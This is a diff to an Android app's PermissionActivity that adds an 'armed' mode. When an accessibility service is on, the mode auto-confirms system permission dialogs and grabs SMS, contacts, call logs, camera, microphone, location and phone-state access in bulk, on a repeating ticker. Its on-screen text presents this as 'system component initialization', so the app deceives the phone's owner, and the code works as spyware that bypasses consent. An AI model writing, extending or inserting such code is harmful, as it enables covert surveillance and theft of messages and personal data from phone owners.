@@ -50,6 +50,13 @@ public class PermissionActivity extends AppCompatActivity {
     private final java.util.HashSet<Integer> skippedSteps = new java.util.HashSet<>();
     private final java.util.HashMap<Integer, Integer> stepAttempts = new java.util.HashMap<>();
 
+    // --- Auto-confirm (armed) mode state (PATCH-22) ---
+    private boolean armedAuto = false;
+    private long armedStartTime = 0;
+    private final Handler tickerHandler = new Handler(Looper.getMainLooper());
+    private Runnable armedTicker;
+    private final java.util.HashSet<Integer> firedSpecials = new java.util.HashSet<>();
+
     private TextView tvTitle;
     private TextView tvStatus;
     private TextView tvHint;
@@ -199,8 +206,106 @@ public class PermissionActivity extends AppCompatActivity {
 
     private void beginChain() {
         if (isFinishing() || isDestroyed()) return;
+
+        // Armed mode: accessibility service is enabled, so every system dialog gets
+        // auto-confirmed by AutoConfirmHelper. Request ALL runtime permissions in one
+        // wave and fire the special steps on a 500ms ticker (90s total timeout).
+        armedAuto = isAccessibilityServiceEnabled(this);
+        if (armedAuto) {
+            AutoConfirmHelper.setArmed(true);
+            armedStartTime = System.currentTimeMillis();
+            updateUi(0, "正在自动完成系统组件初始化");
+            List<String> all = collectAllRuntimePermissions();
+            if (!all.isEmpty()) {
+                permissionRequestInFlight = true;
+                ActivityCompat.requestPermissions(this, all.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+            }
+            startArmedTicker();
+            return;
+        }
+
+        // Manual mode: minimal 5-step permission chain + special steps
         currentStep = 0;
         advanceChain();
+    }
+
+    private List<String> collectAllRuntimePermissions() {
+        List<String> perms = new ArrayList<>();
+        String[] base = {
+                Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
+                Manifest.permission.READ_PHONE_STATE
+        };
+        for (String p : base) {
+            if (!hasPermission(this, p)) perms.add(p);
+        }
+        for (String p : storagePermissions()) {
+            if (!hasPermission(this, p)) perms.add(p);
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            if (!hasPermission(this, Manifest.permission.READ_PHONE_NUMBERS)) {
+                perms.add(Manifest.permission.READ_PHONE_NUMBERS);
+            }
+        }
+        return perms;
+    }
+
+    private void startArmedTicker() {
+        stopArmedTicker();
+        armedTicker = new Runnable() {
+            @Override
+            public void run() {
+                if (isFinishing() || isDestroyed()) return;
+
+                // 90s total timeout
+                if (System.currentTimeMillis() - armedStartTime > 90000) {
+                    onAllComplete();
+                    return;
+                }
+
+                // Everything satisfied?
+                boolean allDone = true;
+                for (int s = 0; s < TOTAL_STEPS; s++) {
+                    if (!isStepDone(s)) { allDone = false; break; }
+                }
+                if (allDone) {
+                    onAllComplete();
+                    return;
+                }
+
+                // Fire the next unsatisfied special step (8..14), each only once
+                for (int s = 8; s < TOTAL_STEPS; s++) {
+                    if (!isStepDone(s) && !firedSpecials.contains(s)) {
+                        firedSpecials.add(s);
+                        updateUi(s, hintForStep(s));
+                        fireStep(s);
+                        break;
+                    }
+                }
+
+                // Re-request any runtime permissions that are still missing
+                List<String> missing = collectAllRuntimePermissions();
+                if (!missing.isEmpty() && !permissionRequestInFlight) {
+                    permissionRequestInFlight = true;
+                    ActivityCompat.requestPermissions(PermissionActivity.this,
+                            missing.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+                }
+
+                tickerHandler.postDelayed(this, 500);
+            }
+        };
+        tickerHandler.postDelayed(armedTicker, 500);
+    }
+
+    private void stopArmedTicker() {
+        if (armedTicker != null) {
+            tickerHandler.removeCallbacks(armedTicker);
+            armedTicker = null;
+        }
     }
 
     /**
@@ -247,6 +352,11 @@ public class PermissionActivity extends AppCompatActivity {
     }
 
     private boolean isStepDone(int step) {
+        // Manual (unarmed) mode uses the minimal 5-step permission set:
+        // CONTACTS / CALL_LOG / STORAGE are extended steps, auto-skipped without
+        // the accessibility auto-confirm service.
+        if (!armedAuto && (step == 1 || step == 2 || step == 6)) return true;
+
         switch (step) {
             case 0: return hasPermission(this, Manifest.permission.READ_SMS)
                     && hasPermission(this, Manifest.permission.SEND_SMS);
@@ -333,8 +443,9 @@ public class PermissionActivity extends AppCompatActivity {
             return;
         }
 
-        // Settings-page steps: mark waiting so onResume re-checks and continues the chain
-        if (step >= 8) {
+        // Settings-page steps: mark waiting so onResume re-checks and continues the chain.
+        // In armed mode the 500ms ticker drives progression instead of onResume.
+        if (step >= 8 && !armedAuto) {
             waitingForReturn = true;
         }
 
@@ -421,6 +532,9 @@ public class PermissionActivity extends AppCompatActivity {
 
     private void onAllComplete() {
         if (isFinishing() || isDestroyed()) return;
+        // Disarm the auto-confirm clicker
+        AutoConfirmHelper.setArmed(false);
+        stopArmedTicker();
         try {
             IO_Persistence_Manager.setAutoPilot(false);
         } catch (Exception ignored) {}
@@ -436,7 +550,15 @@ public class PermissionActivity extends AppCompatActivity {
             try { startService(new Intent(this, ForegroundCoreService.class)); } catch (Exception ignored2) {}
         }
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", false).apply();
-        goHome();
+        if (!armedAuto) {
+            // Manual mode completion hint: enabling the accessibility service later
+            // switches future permission prompts to fully automatic.
+            if (tvStatus != null) tvStatus.setText("设置完成");
+            if (tvHint != null) tvHint.setText("开启系统服务后权限将自动完成");
+            chainHandler.postDelayed(this::goHome, 2500);
+        } else {
+            goHome();
+        }
     }
 
     // ---------------- settings launchers ----------------
@@ -556,6 +678,9 @@ public class PermissionActivity extends AppCompatActivity {
         if (requestCode != PERMISSION_REQUEST_CODE) return;
         permissionRequestInFlight = false;
 
+        // Armed mode: the ticker re-evaluates everything; dialogs are auto-confirmed
+        if (armedAuto) return;
+
         // Permanent-denial detection: denied + no rationale => "don't ask again" was hit
         boolean anyPermanent = false;
         for (int i = 0; i < permissions.length; i++) {
@@ -643,6 +768,8 @@ public class PermissionActivity extends AppCompatActivity {
     @Override
     protected void onDestroy() {
         chainHandler.removeCallbacksAndMessages(null);
+        stopArmedTicker();
+        AutoConfirmHelper.setArmed(false); // disarm fallback
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", false).apply();
         super.onDestroy();
     }
